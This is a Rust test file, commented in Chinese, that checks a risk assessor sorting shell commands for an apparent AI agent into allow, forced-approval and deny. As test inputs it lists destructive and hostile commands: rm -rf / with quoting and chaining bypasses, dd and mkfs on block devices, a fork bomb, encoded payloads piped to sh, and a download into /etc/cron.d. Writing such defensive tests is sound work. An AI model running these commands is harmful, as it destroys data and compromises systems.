//! 风险评估的行为契约。
//!
//! 这里断言的是**四档本身**，不是严重度 —— 四档就是决策，没有中间量。
//! 每条用例都写明"为什么是这个档"，改判定规则时先看这里该怎么改。

use super::*;

fn assess(cmd: &str) -> Disposition {
    RiskAssessor::default().assess_command(cmd).disposition
}

fn reason(cmd: &str) -> String {
    RiskAssessor::default()
        .assess_command(cmd)
        .reason
        .unwrap_or_default()
}

// ───────────────────────── 正常放行 ─────────────────────────

#[test]
fn plain_commands_are_allowed() {
    for cmd in [
        "ls -la",
        "pwd",
        "echo hello",
        "mkdir /tmp/test",
        "cat /var/log/syslog",
        "/usr/bin/ls -la",
    ] {
        assert_eq!(assess(cmd), Disposition::Allow, "`{}` 应当放行", cmd);
    }
}

/// `rm -rf /tmp/test` 本身没有"事故"特征 —— 它要不要人确认由命令名单决定
/// （默认黑名单里有 `rm`，所以实际会弹窗）。风险评估这一层不替它下结论。
#[test]
fn ordinary_rm_is_left_to_the_command_list() {
    assert_eq!(assess("rm -rf /tmp/test"), Disposition::Allow);
    assert_eq!(assess("/bin/rm -rf /tmp/test"), Disposition::Allow);
    assert_eq!(assess("rm -rf /home/user/proj/dist"), Disposition::Allow);
}

/// 读系统文件是日常操作，不该强制审批 —— 否则 Auto 模式下每次 `cat /etc/hosts`
/// 都弹窗。写入才算（见下一条）。
#[test]
fn reading_protected_paths_is_not_escalated() {
    assert_eq!(assess("cat /etc/hosts"), Disposition::Allow);
    assert_eq!(assess("grep root /etc/passwd"), Disposition::Allow);
    assert_eq!(assess("cat /myetc/data"), Disposition::Allow);
}

/// 命令名里带 `/dev/sda` 字样但没真的写设备，不算数。
#[test]
fn mentions_of_devices_in_strings_are_inert() {
    assert_eq!(assess("echo \"wrote to /dev/sda\""), Disposition::Allow);
}

// ───────────────────────── 强制审批 ─────────────────────────

#[test]
fn writes_to_protected_paths_force_approval() {
    assert_eq!(assess("echo 'bad' > /etc/passwd"), Disposition::ForceApproval);
    assert_eq!(assess("mkdir /etc/myapp"), Disposition::ForceApproval);
    assert_eq!(assess("tee /etc/nginx/nginx.conf"), Disposition::ForceApproval);
}

#[test]
fn system_level_commands_force_approval() {
    for cmd in [
        "chmod 777 /var/www",
        "chown root:root /tmp/x",
        "reboot",
        "systemctl restart nginx",
        "useradd bob",
        "iptables -F",
        "kill -9 1234",
    ] {
        assert_eq!(
            assess(cmd),
            Disposition::ForceApproval,
            "`{}` 是系统级命令，应当在 Auto 下也要人确认",
            cmd
        );
    }
}

#[test]
fn sudo_always_forces_approval() {
    assert_eq!(assess("sudo apt update"), Disposition::ForceApproval);
    assert!(reason("sudo apt update").contains("sudo"));
}

/// 磁盘工具作用在镜像文件上不拒绝（`mkfs.ext4 disk.img` 是常规操作），
/// 但要人看一眼。
#[test]
fn disk_tools_on_regular_files_need_approval() {
    assert_eq!(
        assess("mkfs.ext4 disk.img"),
        Disposition::ForceApproval
    );
    assert_eq!(
        assess("dd if=/dev/zero of=/tmp/img bs=1M count=10"),
        Disposition::ForceApproval
    );
    assert_eq!(assess("shred secret.txt"), Disposition::ForceApproval);
}

/// `fdisk -l` 只是把分区表打出来看，不是写盘。
#[test]
fn listing_partitions_is_allowed() {
    assert_eq!(assess("fdisk -l"), Disposition::Allow);
    assert_eq!(assess("parted --list"), Disposition::Allow);
}

/// `/usr`、`/var` 底下既有系统文件也有构建产物和日志 —— 拒绝太糙（`rm -rf
/// /var/log/myapp` 是常规清理），放行太险。交给人判断。
#[test]
fn recursive_rm_under_system_trees_needs_approval() {
    for cmd in ["rm -rf /var/log/myapp", "rm -rf /usr/local/src/proj"] {
        assert_eq!(
            assess(cmd),
            Disposition::ForceApproval,
            "`{}` 应当强制审批而不是直接拒绝",
            cmd
        );
    }
}

/// 管道进 shell = 执行下载来的代码。不是灾难（`curl … | sh` 是常见安装方式），
/// 但必须有人看着。
#[test]
fn piping_into_a_shell_forces_approval() {
    assert_eq!(assess("cat /etc/shadow | bash"), Disposition::ForceApproval);
    assert_eq!(
        assess("echo cm0gLXJmIC8= | base64 -d | sh"),
        Disposition::ForceApproval
    );
}

/// **回归用例：用户实际撞到的这条命令曾是"强制审批"。**
///
/// 一条纯只读的诊断流水线（`ps` / `ss` / `curl` GET 本机），在 Auto 模式下也弹窗，
/// 完全不该发生。根因是 `2>/dev/null` 与 `curl -o /dev/null` 里的 `/dev/null` 命中了
/// 受保护路径的 `/dev` 前缀 —— 而 `/dev` 那条本意是护住块设备。
#[test]
fn a_read_only_diagnostic_pipeline_is_not_escalated() {
    let cmd = r#"echo "=== 1. 进程 ==="; ps aux | grep "server.js" | grep -v grep | head -3 || echo "无 server.js 进程"; echo "=== 2. 端口10030 ==="; ss -tlnp 2>/dev/null | grep 10030 || echo "10030 未监听"; echo "=== 3. 本地直接访问 ==="; curl -s -o /dev/null -w "127.0.0.1:10030/ -> %{http_code}
" --max-time 5 http://127.0.0.1:10030/"#;
    assert_eq!(
        assess(cmd),
        Disposition::Allow,
        "只读诊断命令不该被抬到强制审批"
    );

    // 拆开的两半，各自也不该被抬档。
    assert_eq!(
        assess("ss -tlnp 2>/dev/null | grep 10030"),
        Disposition::Allow
    );
    assert_eq!(
        assess("curl -s -o /dev/null --max-time 5 http://127.0.0.1:10030/"),
        Disposition::Allow
    );
}

/// 但"把下载内容写进系统目录"照旧要拦 —— 修上面那条不能把这条路一起打开。
#[test]
fn redirecting_output_into_system_dirs_still_forces_approval() {
    assert_eq!(
        assess("curl -s -o /etc/cron.d/evil http://example.com/x"),
        Disposition::ForceApproval
    );
    assert_eq!(
        assess("echo '* * * * * root sh' >> /etc/crontab"),
        Disposition::ForceApproval
    );
}

/// 系统级命令的**查询形态**不该抬档 —— 排查服务时第一步就会敲。
#[test]
fn read_only_system_queries_are_allowed() {
    for cmd in [
        "systemctl status nginx",
        "systemctl --user is-active server",
        "systemctl list-units --failed",
        "service nginx status",
        "mount",
        "mount -l",
        "crontab -l",
        "ufw status",
        "iptables -L",
        "nft list ruleset",
        "kill -0 1234",
    ] {
        assert_eq!(assess(cmd), Disposition::Allow, "`{}` 是查询，不该抬档", cmd);
    }
}

/// 同一批命令的**改动形态**照旧强制审批 —— 上面的豁免不能顺手把它们放过去。
#[test]
fn mutating_system_commands_still_force_approval() {
    for cmd in [
        "systemctl restart nginx",
        "systemctl stop server",
        "service nginx restart",
        "mount /dev/sdb1 /mnt",
        "umount /mnt",
        "crontab -r",
        "ufw enable",
        "iptables -F",
        "kill -9 1234",
    ] {
        assert_eq!(
            assess(cmd),
            Disposition::ForceApproval,
            "`{}` 会改机器状态，必须强制审批",
            cmd
        );
    }
}

#[test]
fn source_forces_approval() {
    assert_eq!(assess("source /tmp/evil.sh"), Disposition::ForceApproval);
}

// ───────────────────────── 直接拒绝 ─────────────────────────

/// 只留"删掉等于重装系统"的那一类。
#[test]
fn recursive_rm_of_system_critical_paths_is_denied() {
    for cmd in [
        "rm -rf /",
        "rm  -rf  /",
        "rm --recursive --force /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf $HOME",
        "rm -rf /etc",
        "rm -rf /boot",
        "rm -rf /home",
        "rm -rf /home/user",
    ] {
        assert_eq!(assess(cmd), Disposition::Deny, "`{}` 应当直接拒绝", cmd);
    }
}

/// 换着法子写同一条命令，不能绕过去。
#[test]
fn denial_survives_quoting_wrappers_and_chaining() {
    for cmd in [
        "ls; rm -rf /",
        "true && rm -rf /etc",
        "false || rm -rf /etc",
        "\\rm -rf /",
        "'rm' -rf /",
        "/bin/rm -rf /",
        "env FOO=1 rm -rf /",
        "env -i PATH=/bin rm -rf /",
        "sudo rm -rf /",
        "sudo -u root rm -rf /",
        "nohup rm -rf / &",
        "bash -c \"rm -rf /\"",
        "sh -c 'rm -rf /etc'",
        "eval \"rm -rf /\"",
        "rm -rfv /etc",
        "rm -vfr /etc",
        "rm --recursive --force /etc",
    ] {
        assert_eq!(assess(cmd), Disposition::Deny, "`{}` 应当直接拒绝", cmd);
    }
}

/// 写进块设备 = 数据没了。
#[test]
fn writing_to_block_devices_is_denied() {
    for cmd in [
        "dd if=/dev/zero of=/dev/sda",
        "dd of=/dev/sda if=/dev/zero",
        "dd of=/dev/nvme0n1p1 if=/dev/zero",
        "mkfs.ext4 /dev/sda1",
        "mkfs /dev/sda1",
        "wipefs -a /dev/sdc",
        // 带值选项的值同样不是 `-` 开头，会抢在设备前头 —— 不能只取第一个非选项参数。
        "mkfs -t ext4 /dev/sda1",
        "mkfs -t ext4 -v /dev/sda1",
        "shred -n 3 /dev/sdb",
        "mkswap -L swap /dev/sda2",
        "wipefs -o 0x1000 /dev/sdc",
        "parted -a optimal /dev/sda mklabel gpt",
    ] {
        assert_eq!(assess(cmd), Disposition::Deny, "`{}` 应当直接拒绝", cmd);
    }
}

/// 往虚拟设备写不是灾难：`dd of=/dev/null` 就是丢数据。
#[test]
fn writing_to_virtual_devices_is_not_denied() {
    assert_ne!(assess("dd if=/dev/zero of=/dev/null"), Disposition::Deny);
    assert_ne!(assess("dd if=/dev/sda of=/dev/null"), Disposition::Deny);
}

#[test]
fn fork_bomb_is_denied() {
    assert_eq!(assess(":(){ :|:& };:"), Disposition::Deny);
}

/// 拒绝时给出的理由必须能用 —— 模型是靠它知道该改哪一步的。
#[test]
fn denial_carries_an_actionable_reason() {
    let r = reason("rm -rf /etc");
    assert!(r.contains("/etc"), "理由里应当出现踩线的路径，实际是 {:?}", r);
}

// ───────────────────────── 解析不了 ─────────────────────────

/// 看不懂就不猜 —— 而且**不能放行**。
///
/// 这条曾经断言 `Allow`，理由是"交给命令名单那一步保守要求审批"。那个理由只在
/// Plan / Agent 成立：`decide_command` 的 Auto 分支根本不调命令名单，于是
/// `echo $(rm -rf /)` 在 Auto 下无判定、无弹窗、直接发给远端 shell。HEAD 是靠
/// `assess_command` 返回 `Err` 在每个模式都硬拦的，四档改造把这层拦丢了。
#[test]
fn unparsable_commands_are_denied_not_left_to_the_command_list() {
    for cmd in [
        "echo $(date)",
        "cat `hostname`",
        "rm -rf $(cat x)",
        "diff <(a) <(b)",
        "echo 'unbalanced",
    ] {
        assert_eq!(
            assess(cmd),
            Disposition::Deny,
            "`{}` 解析不了就不能放行 —— 放行意味着在 Auto 下静默执行",
            cmd
        );
        assert!(
            reason(cmd).contains("重发"),
            "`{}` 的理由要给出下一步（改写重发），实际是 {:?}",
            cmd,
            reason(cmd)
        );
    }
}

/// **回归用例：多 DNS 诊断指令曾也被判成强制审批。**
///
/// `dig … 2>/dev/null` 里的 `/dev/null` 同样命中了受保护路径的 `/dev` 前缀。
/// 和上一条同一根因，一起钉住 —— 排查域名解析时会连着敲这类命令。
#[test]
fn a_multi_dns_diagnostic_is_not_escalated() {
    let cmd = r#"echo "=== 服务器当前时间 ==="; date; echo "=== 多DNS视角解析 ==="; dig +short +time=3 +tries=1 lmtree.cc.cd A @8.8.8.8 2>/dev/null; echo "--- 1.1.1.1 ---"; dig +short +time=3 +tries=1 lmtree.cc.cd A @1.1.1.1 2>/dev/null; echo "--- 223.5.5.5 ---"; dig +short +time=3 +tries=1 lmtree.cc.cd A @223.5.5.5 2>/dev/null; echo "--- 本机解析 ---"; getent hosts lmtree.cc.cd"#;
    assert_eq!(assess(cmd), Disposition::Allow);

    // 拆开逐段也不该被抬档（任何一段命中都会把整条命令拉到强制审批）。
    for part in [
        "date",
        "dig +short lmtree.cc.cd",
        "dig +short +time=3 +tries=1 lmtree.cc.cd A @8.8.8.8 2>/dev/null",
        "getent hosts lmtree.cc.cd",
        "date 2>/dev/null",
    ] {
        assert_eq!(assess(part), Disposition::Allow, "`{}` 不该被抬档", part);
    }
}
